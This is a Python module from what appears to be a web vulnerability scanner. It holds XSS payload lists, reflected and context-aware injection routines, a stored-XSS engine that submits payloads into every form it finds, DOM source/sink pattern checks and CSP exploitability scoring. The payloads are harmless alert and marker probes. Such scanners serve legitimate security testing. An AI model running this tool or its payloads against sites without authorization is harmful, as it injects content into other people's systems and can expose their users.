# xss_part.py — XSS phases & helpers

import re
import time
import html
import uuid  # ✅ Phase 11
import urllib.parse as urllib_parse
from urllib.parse import urlparse, urlencode, urlunparse, urljoin
from copy import deepcopy
from bs4 import BeautifulSoup
import requests

# --- Basic reflected XSS payloads ---
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '";alert(1);//',
    "';alert(1);//",
    "</script><script>alert(1)</script>",
    '" autofocus onfocus=alert(1) x="'
]

# Phase 8: Context-specific XSS payloads
CTX_XSS_PAYLOADS = {
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>"
    ],
    "attr": [
        "\"><script>alert(1)</script>",
        '" autofocus onfocus=alert(1) x="'
    ],
    "js": [
        '";alert(1);//',
        "';alert(1);//",
        "</script><script>alert(1)</script>"
    ]
}

# Phase 9: Smart payloads
XSS_SMART_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe srcdoc='<script>alert(1)</script>'>",
]

XSS_KEY_PARTS = [
    "script", "onerror", "onload", "alert",
    "<img", "<svg", "<iframe", "srcdoc", "javascript:"
]

HTML_ENCODE_MARKERS = ["&lt;", "&gt;", "&quot;", "&#", "&amp;"]

# -------------------------
# Phase 12: CSP & Security Headers Awareness
# -------------------------
def _split_csp_directives(csp: str) -> dict:
    """
    Returns dict like {"default-src": ["'self'"], "script-src": ["'self'", "'unsafe-inline'"], ...}
    """
    out = {}
    if not csp:
        return out
    parts = [p.strip() for p in csp.split(";") if p.strip()]
    for p in parts:
        tokens = p.split()
        if not tokens:
            continue
        name = tokens[0].lower()
        vals = [t.strip() for t in tokens[1:]]
        out[name] = vals
    return out

def analyze_csp(headers: dict) -> dict:
    """
    Heuristic CSP assessment for typical reflected XSS payloads (inline/event handlers).
    Returns:
      {
        "present": bool,
        "level": "none" | "strong" | "weak",
        "reason": str,
        "raw": str
      }
    """
    csp = headers.get("Content-Security-Policy") or headers.get("content-security-policy") or ""
    csp = (csp or "").strip()
    if not csp:
        return {"present": False, "level": "none", "reason": "No CSP header", "raw": ""}

    d = _split_csp_directives(csp)

    # Effective script policy: script-src preferred, else default-src
    script_policy = d.get("script-src") or d.get("default-src") or []
    sp_join = " ".join(script_policy).lower()

    has_nonce_or_hash = any(
        v.startswith("'nonce-") or v.startswith("'sha256-") or v.startswith("'sha384-") or v.startswith("'sha512-")
        for v in script_policy
    )

    allows_inline = "'unsafe-inline'" in sp_join
    allows_eval = "'unsafe-eval'" in sp_join
    allows_any = "*" in script_policy
    allows_data_blob = any(v in ("data:", "blob:") for v in script_policy)

    # Weak CSP signals (more likely exploitable)
    if allows_inline or allows_eval or allows_any:
        reasons = []
        if allows_inline: reasons.append("unsafe-inline")
        if allows_eval: reasons.append("unsafe-eval")
        if allows_any: reasons.append("wildcard *")
        if allows_data_blob: reasons.append("data:/blob:")
        return {"present": True, "level": "weak", "reason": "CSP allows " + ", ".join(reasons), "raw": csp}

    # If nonce/hash required and no unsafe-inline => strong against inline payloads
    if has_nonce_or_hash and not allows_inline:
        return {"present": True, "level": "strong", "reason": "Nonce/Hash required for scripts (inline blocked)", "raw": csp}

    # Generally: no unsafe-inline => inline scripts blocked
    if not allows_inline:
        return {"present": True, "level": "strong", "reason": "No unsafe-inline (inline/event handlers likely blocked)", "raw": csp}

    return {"present": True, "level": "strong", "reason": "CSP seems restrictive", "raw": csp}

def analyze_x_xss_protection(headers: dict) -> dict:
    """
    Legacy header. Useful for reporting only (modern browsers mostly ignore it).
    """
    v = headers.get("X-XSS-Protection") or headers.get("x-xss-protection") or ""
    v = (v or "").strip()
    if not v:
        return {"present": False, "value": "", "status": "missing"}
    if v.startswith("0"):
        return {"present": True, "value": v, "status": "disabled"}
    if v.startswith("1"):
        return {"present": True, "value": v, "status": "enabled"}
    return {"present": True, "value": v, "status": "unknown"}

def classify_xss_exploitability(csp_info: dict) -> str:
    """
    Returns:
      - VULNERABLE_BUT_CSP_MITIGATES
      - VULNERABLE_AND_EXPLOITABLE
    """
    if not csp_info or csp_info.get("level") == "strong":
        return "VULNERABLE_BUT_CSP_MITIGATES"
    return "VULNERABLE_AND_EXPLOITABLE"

def enrich_finding_with_headers(finding: dict, resp) -> dict:
    """
    Attach CSP + X-XSS-Protection analysis to finding.
    """
    if not finding or not resp:
        return finding

    csp_info = analyze_csp(getattr(resp, "headers", {}) or {})
    xxp_info = analyze_x_xss_protection(getattr(resp, "headers", {}) or {})

    exploit_status = classify_xss_exploitability(csp_info)

    extra = finding.get("extra") or {}
    extra["csp_present"] = csp_info.get("present")
    extra["csp_level"] = csp_info.get("level")
    extra["csp_reason"] = csp_info.get("reason")
    extra["csp_raw"] = csp_info.get("raw")
    extra["x_xss_protection_present"] = xxp_info.get("present")
    extra["x_xss_protection_value"] = xxp_info.get("value")
    extra["x_xss_protection_status"] = xxp_info.get("status")
    finding["extra"] = extra

    finding["exploit_status"] = exploit_status
    return finding


# -------------------------
# Auto-verify XSS
# -------------------------
def auto_verify_xss(method, url, param_name, original_params, post_data, headers,
                    request_with_timeout, json_body=None, json_key=None):
    token = f"INJ_TOKEN_{int(time.time())}"
    payload = f"<script>console.log('{token}')</script>"

    if json_body is not None and json_key is not None:
        jb = deepcopy(json_body); jb[json_key] = payload
        r = request_with_timeout(method, url, headers=headers, json_body=jb)
    else:
        parsed = urlparse(url)
        params_copy = deepcopy(original_params) if original_params else {}
        key = param_name if param_name is not None else "_scantest"
        params_copy[key] = [payload]
        q = urlencode({k: v[0] for k, v in params_copy.items()}, doseq=False)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))

        if method.upper() == "POST" and post_data and key in post_data:
            pd = deepcopy(post_data); pd[key] = payload
            r = request_with_timeout("POST", url, data=pd, headers=headers)
        else:
            r = request_with_timeout("GET" if method.upper() == "GET" else "POST", new_url, data=post_data, headers=headers)

    if not r:
        return False
    text = r.text or ""
    return (payload in text) or (token in text)


# -------------------------
# Phase 8: Context-aware XSS
# -------------------------
def detect_xss_context(html_text: str, marker: str):
    if not html_text or marker not in html_text:
        return None
    idx = html_text.find(marker)
    if idx == -1:
        return None

    open_idx = html_text.rfind("<script", 0, idx)
    close_idx = html_text.rfind("</script", 0, idx)
    if open_idx != -1 and (close_idx == -1 or close_idx < open_idx):
        return "js"

    window = 120
    start = max(0, idx - window)
    end = min(len(html_text), idx + window)
    snippet = html_text[start:end]

    attr_re = re.compile(
        r"\b[\w:-]+\s*=\s*(['\"]).*?" + re.escape(marker) + r".*?\1",
        re.DOTALL | re.IGNORECASE
    )
    if attr_re.search(snippet):
        return "attr"

    return "html"

def run_context_aware_xss_phase(method, url, params, headers, json_body, post_data,
                                base_status, base_text, verbose, fingerprint,
                                request_with_timeout, _single_injection_attempt, log=print):
    findings = []
    method = method.upper()
    if method != "GET" or not params or json_body is not None:
        return findings

    parsed = urlparse(url)

    for param_name, values in params.items():
        marker = f"CTX_XSS_{param_name}_{int(time.time() * 1000)}"

        new_params = deepcopy(params)
        new_params[param_name] = [marker]
        query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
        marker_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

        r = request_with_timeout(method, marker_url, headers=headers)
        if not r or r.status_code >= 500:
            continue

        body = r.text or ""
        if marker not in body:
            continue

        ctx = detect_xss_context(body, marker)
        if verbose:
            log(f"[CTX-XSS] {url} param '{param_name}' marker reflected in context={ctx}")

        payloads = CTX_XSS_PAYLOADS.get(ctx, [])
        for pl in payloads:
            f = _single_injection_attempt(
                method=method,
                url=url,
                param_name=param_name,
                original_params=params,
                base_text=base_text,
                base_status=base_status,
                payload=pl,
                post_data=post_data,
                headers=headers,
                json_body=None,
                json_key=None,
                verbose=verbose,
                fingerprint=fingerprint
            )
            if f:
                # keep context info
                extra = f.get("extra") or {}
                extra["xss_context"] = ctx
                f["extra"] = extra

                # Phase 12 enrichment (best effort: use response headers by re-fetching test_url if present)
                test_url = f.get("test_url")
                if test_url:
                    rr = request_with_timeout("GET", test_url, headers=headers)
                    if rr:
                        f = enrich_finding_with_headers(f, rr)

                findings.append(f)

    return findings


# -------------------------
# Phase 9: Advanced Reflected XSS
# -------------------------
def index_to_line_col(text: str, idx: int):
    line = text.count("\n", 0, idx) + 1
    last_nl = text.rfind("\n", 0, idx)
    if last_nl == -1:
        col = idx + 1
    else:
        col = idx - last_nl
    return line, col

def detect_reflection_context_adv(text: str, idx: int) -> str:
    window_before = text[max(0, idx - 80):idx].lower()
    window_after = text[idx:idx + 80].lower()

    if '="' in window_before or "='" in window_before:
        return "HTML Attribute"
    if "<script" in window_before:
        return "JavaScript Context"
    if "<" in window_before and ">" in window_after:
        return "HTML Tag Body"
    if "href=" in window_before or "src=" in window_before:
        return "URL / Attribute"
    return "Unknown"

def find_reflections_for_payload(payload: str, response_text: str):
    results = []
    if response_text is None:
        return results

    layers = [
        ("raw", response_text),
        ("html_unescape", html.unescape(response_text)),
        ("url_unquote+html_unescape", html.unescape(urllib_parse.unquote(response_text)))
    ]

    for layer_name, text in layers:
        if not text:
            continue

        start_idx = text.find(payload)
        if start_idx != -1:
            line, col = index_to_line_col(text, start_idx)
            ctx = detect_reflection_context_adv(text, start_idx)
            encoded = any(m in response_text for m in HTML_ENCODE_MARKERS)
            results.append({
                "match_type": "exact",
                "layer": layer_name,
                "payload": payload,
                "matched_string": payload,
                "line": line,
                "column": col,
                "context": ctx,
                "html_encoded": encoded
            })

        text_low = text.lower()
        for key in XSS_KEY_PARTS:
            key_low = key.lower()
            idx = text_low.find(key_low)
            if idx != -1:
                line, col = index_to_line_col(text, idx)
                ctx = detect_reflection_context_adv(text, idx)
                encoded = any(m in response_text for m in HTML_ENCODE_MARKERS)
                results.append({
                    "match_type": "partial",
                    "layer": layer_name,
                    "payload": payload,
                    "matched_string": key,
                    "line": line,
                    "column": col,
                    "context": ctx,
                    "html_encoded": encoded
                })

    return results

def guess_xss_severity_from_context(context: str) -> str:
    ctx = (context or "").lower()
    if "javascript" in ctx:
        return "high"
    if "attribute" in ctx or "url" in ctx:
        return "medium"
    return "low"

def run_advanced_reflected_xss_phase(method, url, params, headers, base_text_raw, fingerprint,
                                    request_with_timeout, compute_score, log, now_ts, verbose=False):
    findings = []
    method = method.upper()
    if not params:
        return findings

    parsed = urlparse(url)
    base_len = len(base_text_raw or "")

    for param_name, values in params.items():
        original_value = values[0] if values else ""

        for payload in XSS_SMART_PAYLOADS:
            test_params = deepcopy(params)
            test_params[param_name] = [f"{original_value}{payload}"]
            query = urlencode({k: v[0] for k, v in test_params.items()}, doseq=False)
            inj_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

            resp = request_with_timeout(method, inj_url, headers=headers)
            if not resp:
                continue

            body = resp.text or ""
            reflections = find_reflections_for_payload(payload, body)
            if not reflections:
                continue

            best = sorted(reflections, key=lambda r: 0 if r["match_type"] == "exact" else 1)[0]
            ctx = best["context"]
            severity = guess_xss_severity_from_context(ctx)

            if severity == "high":
                base_conf = 50
                score_delta = 45
            elif severity == "medium":
                base_conf = 40
                score_delta = 35
            else:
                base_conf = 30
                score_delta = 25

            verify_result = {
                "verified": True,
                "evidence": f"Reflected XSS payload at line {best['line']}, column {best['column']} in {ctx}",
                "score_delta": score_delta,
                "elapsed": 0.0
            }

            score = compute_score(base_confidence=base_conf, fingerprint=fingerprint, verify_result=verify_result, payload=payload)
            status_label = "confirmed" if score >= 50 else ("probable" if score >= 30 else "low")

            finding = {
                "timestamp": now_ts(),
                "url": url,
                "test_url": inj_url,
                "method": method,
                "injected_param": param_name,
                "payload": payload,
                "vuln_type": "Reflected XSS",
                "reason": verify_result["evidence"],
                "status_code": resp.status_code,
                "auto_verified": True,
                "verify": verify_result,
                "fingerprint": fingerprint or {},
                "score": score,
                "status": status_label,
                "base_len": base_len,
                "resp_len": len(body or ""),
                "extra": {
                    "xss_match_type": best["match_type"],
                    "xss_layer": best["layer"],
                    "xss_context": ctx,
                    "xss_line": best["line"],
                    "xss_column": best["column"],
                    "xss_html_encoded": best["html_encoded"],
                    "xss_matched_string": best["matched_string"],
                }
            }

            # ✅ Phase 12: attach CSP / X-XSS-Protection / exploitability
            finding = enrich_finding_with_headers(finding, resp)

            if verbose:
                # لو CSP قوي: خليها تطلع واضحة باللوج
                es = finding.get("exploit_status")
                csp_lvl = (finding.get("extra") or {}).get("csp_level")
                log(f"[XSS-REFLECTED][{severity.upper()}][{es}][CSP={csp_lvl}] {url} param={param_name} ctx={ctx} payload={payload}")

            findings.append(finding)
            break

    return findings


# -------------------------
# Phase 10: DOM XSS static analysis
# -------------------------
DOM_XSS_SOURCES = [
    r"location\.hash",
    r"location\.search",
    r"location\.href",
    r"document\.URL",
    r"document\.documentURI",
    r"document\.referrer",
    r"localStorage",
    r"sessionStorage",
    r"window\.name"
]

DOM_XSS_SINKS = [
    r"innerHTML",
    r"outerHTML",
    r"document\.write",
    r"document\.writeln",
    r"insertAdjacentHTML",
    r"eval\(",
    r"setTimeout\(",
    r"setInterval\(",
    r"Function\(",
    r"\.html\("
]

DOM_SRC_RES = [re.compile(p) for p in DOM_XSS_SOURCES]
DOM_SINK_RES = [re.compile(p) for p in DOM_XSS_SINKS]

def _analyze_js_for_dom_xss(js_code: str, script_id: str, script_url: str = None):
    results = []
    if not js_code:
        return results

    lines = js_code.splitlines()
    for idx, line in enumerate(lines, start=1):
        line_stripped = line.strip()
        if not line_stripped:
            continue

        has_src = []
        has_sink = []

        for sre in DOM_SRC_RES:
            if sre.search(line_stripped):
                has_src.append(sre.pattern)

        for kre in DOM_SINK_RES:
            if kre.search(line_stripped):
                has_sink.append(kre.pattern)

        if has_src and has_sink:
            results.append({
                "script_id": script_id,
                "script_url": script_url,
                "line_no": idx,
                "line": line_stripped[:300],
                "sources": has_src,
                "sinks": has_sink
            })

    return results

def _collect_scripts_from_html(base_url: str, html_text: str, TIMEOUT: int, headers=None):
    scripts = []
    try:
        soup = BeautifulSoup(html_text, "html.parser")
    except Exception:
        return scripts

    inline_idx = 0
    for s in soup.find_all("script"):
        src = s.get("src")
        if src:
            continue
        code = s.string or ""
        if not code or not code.strip():
            continue
        inline_idx += 1
        scripts.append({"code": code, "id": f"inline_{inline_idx}", "url": None})

    for s in soup.find_all("script", src=True):
        src = s.get("src")
        if not src:
            continue
        js_url = urljoin(base_url, src)
        try:
            resp = requests.get(js_url, headers=headers, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            continue
        if not resp or resp.status_code != 200:
            continue
        code = resp.text or ""
        if not code.strip():
            continue
        scripts.append({"code": code, "id": f"external::{src}", "url": js_url})

    return scripts

def run_dom_xss_phase(url, base_html, TIMEOUT, headers=None, fingerprint=None,
                      compute_score=None, log=print, now_ts=None, verbose=False):
    findings = []
    if not base_html:
        return findings

    scripts = _collect_scripts_from_html(url, base_html, TIMEOUT, headers=headers)
    if not scripts:
        return findings

    for sc in scripts:
        code = sc["code"]
        sid = sc["id"]
        surl = sc["url"]

        raw_hits = _analyze_js_for_dom_xss(code, sid, script_url=surl)
        for h in raw_hits:
            reason = (
                "Potential DOM-based XSS: source(s) "
                + ", ".join(h["sources"])
                + " flowing into sink(s) "
                + ", ".join(h["sinks"])
                + f" at line {h['line_no']} in script {h['script_id']}"
            )

            verify_result = {"verified": False, "evidence": "static JS pattern (source→sink) only",
                             "score_delta": 0, "elapsed": 0.0}

            score = 35
            if compute_score:
                score = compute_score(base_confidence=35, fingerprint=fingerprint, verify_result=verify_result, payload=None)

            finding = {
                "timestamp": now_ts() if now_ts else "",
                "url": url,
                "test_url": url,
                "method": "GET",
                "injected_param": "[DOM_ANALYSIS]",
                "payload": "[DOM_ANALYSIS]",
                "vuln_type": "DOM XSS (client-side)",
                "reason": reason,
                "status_code": None,
                "auto_verified": False,
                "verify": verify_result,
                "fingerprint": fingerprint or {},
                "score": score,
                "status": "probable" if score >= 30 else "low",
                "base_len": len(base_html or ""),
                "resp_len": len(base_html or ""),
                "extra": {
                    "dom_script_id": h["script_id"],
                    "dom_script_url": h["script_url"],
                    "dom_line_no": h["line_no"],
                    "dom_line_snippet": h["line"],
                    "dom_sources": h["sources"],
                    "dom_sinks": h["sinks"]
                }
            }

            if verbose:
                log(f"[DOM-XSS] {url} script={h['script_id']} line={h['line_no']}")

            findings.append(finding)

    return findings


# -------------------------
# Phase 11: Stored XSS Engine (Unique payload per form)
# -------------------------
def _mk_uid():
    return uuid.uuid4().hex[:10]

def make_unique_stored_payload(uid: str) -> str:
    return f'"><svg/onload=document.body.setAttribute("data-stored-xss","{uid}")><!--{uid}-->'

def marker_present(html_text: str, uid: str) -> bool:
    if not html_text or not uid:
        return False
    # ✅ نركز على comment marker لأنه الأكثر ثباتاً
    return (f"<!--{uid}-->" in html_text) or (uid in html_text)

def extract_forms(html_text: str):
    try:
        soup = BeautifulSoup(html_text, "html.parser")
    except Exception:
        return []
    return soup.find_all("form")

def build_form_submission(form, base_url: str):
    action = form.get("action") or ""
    method = (form.get("method") or "GET").upper()
    target = urljoin(base_url, action)

    inputs = form.find_all(["input", "textarea", "select"])
    fields = []
    for el in inputs:
        name = el.get("name")
        if not name:
            continue
        t = (el.get("type") or "").lower()
        if t in ["submit", "button", "image", "file", "reset"]:
            continue
        fields.append((el, name, t))
    return target, method, fields

def guess_view_pages(discovered_urls: list, input_url: str):
    keywords = ["comment", "comments", "review", "reviews", "post", "posts", "profile", "user", "admin", "feedback", "view"]
    base = urlparse(input_url).netloc
    views = []
    for u in (discovered_urls or []):
        try:
            if urlparse(u).netloc != base:
                continue
        except Exception:
            continue
        lu = u.lower()
        if any(k in lu for k in keywords):
            views.append(u)
    if input_url and input_url not in views:
        views.insert(0, input_url)
    return views[:30]

def _fallback_view_urls(input_page_url: str):
    common = ["/view", "/comments", "/comment", "/reviews", "/review", "/posts", "/post", "/feedback"]
    out = []
    if input_page_url:
        out.append(input_page_url)
        for p in common:
            out.append(urljoin(input_page_url, p))

    seen = set()
    uniq = []
    for u in out:
        if u not in seen:
            uniq.append(u); seen.add(u)
    return uniq

def _merge_view_urls(candidate_view_urls: list, input_page_url: str):
    # ✅ حتى لو candidate موجودة: ضيف fallback دائمًا
    merged = []
    for u in (candidate_view_urls or []):
        if u:
            merged.append(u)
    merged.extend(_fallback_view_urls(input_page_url))

    seen = set()
    uniq = []
    for u in merged:
        if u not in seen:
            uniq.append(u); seen.add(u)
    return uniq[:40]

def run_stored_xss_phase(session, input_page_url: str, input_html: str,
                         candidate_view_urls: list, wait_sec: float = 2.0,
                         log=print, verbose: bool = False, now_ts=None):
    """
    Stored XSS engine:
    - يحقن في كل form
    - ينتظر
    - يزور صفحات عرض (candidate + fallback)
    - يسجّل: input_url + view_url + payload
    - ✅ Phase 12: CSP awareness on the view page
    """
    findings = []
    forms = extract_forms(input_html)
    if not forms:
        return findings

    views = _merge_view_urls(candidate_view_urls, input_page_url)
    if verbose:
        log(f"[STORED-XSS] Testing view pages ({len(views)}): {views}")

    for idx, form in enumerate(forms, start=1):
        target, method, fields = build_form_submission(form, input_page_url)
        if not fields:
            continue

        uid = _mk_uid()
        payload = make_unique_stored_payload(uid)

        data = {}
        injected_fields = []
        for el, name, t in fields:
            if el.name == "textarea" or t in ["", "text", "search", "email", "url", "tel", "password"]:
                data[name] = payload
                injected_fields.append(name)
            elif el.name == "select":
                opt = el.find("option")
                data[name] = opt.get("value") if opt and opt.get("value") is not None else (opt.text if opt else "1")
            else:
                val = el.get("value")
                data[name] = val if val is not None else "1"

        try:
            if method == "POST":
                session.post(target, data=data, timeout=10, allow_redirects=True)
            else:
                session.get(target, params=data, timeout=10, allow_redirects=True)
        except Exception:
            continue

        if verbose:
            log(f"[STORED-XSS] Injected uid={uid} into form#{idx} fields={injected_fields} action={target} method={method}")

        time.sleep(wait_sec)

        for view_url in views:
            try:
                r = session.get(view_url, timeout=10, allow_redirects=True)
            except Exception:
                continue
            if not r or r.text is None:
                continue

            if marker_present(r.text, uid):
                # ✅ Phase 12: CSP on the VIEW page matters for stored XSS execution
                csp_info = analyze_csp(getattr(r, "headers", {}) or {})
                xxp_info = analyze_x_xss_protection(getattr(r, "headers", {}) or {})
                exploit_status = classify_xss_exploitability(csp_info)

                findings.append({
                    "timestamp": now_ts() if now_ts else "",
                    "type": "Stored XSS",
                    "input_url": input_page_url,
                    "input_action": target,
                    "input_method": method,
                    "input_fields": injected_fields,
                    "payload": payload,
                    "uid": uid,
                    "view_url": view_url,
                    "status_code": getattr(r, "status_code", None),
                    "reason": f"Stored marker uid={uid} appeared in view page",
                    "exploit_status": exploit_status,
                    "extra": {
                        "csp_present": csp_info.get("present"),
                        "csp_level": csp_info.get("level"),
                        "csp_reason": csp_info.get("reason"),
                        "csp_raw": csp_info.get("raw"),
                        "x_xss_protection_present": xxp_info.get("present"),
                        "x_xss_protection_value": xxp_info.get("value"),
                        "x_xss_protection_status": xxp_info.get("status"),
                    }
                })
                if verbose:
                    log(f"[STORED-XSS][HIT][{exploit_status}] input={input_page_url} -> view={view_url} uid={uid}")
                break

    return findings

